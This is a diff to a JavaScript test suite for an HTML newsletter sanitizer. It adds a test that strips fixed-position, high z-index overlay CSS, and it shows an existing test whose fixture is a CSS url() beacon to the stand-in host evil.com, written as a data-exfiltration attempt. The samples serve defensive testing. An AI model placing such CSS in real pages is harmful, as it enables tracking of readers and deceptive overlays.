@@ -77,6 +77,13 @@ describe("sanitizeNewsletterHtml", () => {
     expect(result).toContain("width");
   });
 
+  it("strips dangerous CSS from single-quoted style attributes", () => {
+    const html = "<div style='position:fixed;z-index:9999;width:50%'>overlay</div>";
+    const result = sanitizeNewsletterHtml(html);
+    expect(result).not.toContain("position");
+    expect(result).not.toContain("z-index");
+  });
+
   it("strips url() from CSS to prevent data exfiltration", () => {
     const html = '<div style="background:url(https://evil.com/track?id=123)">test</div>';
     const result = sanitizeNewsletterHtml(html);
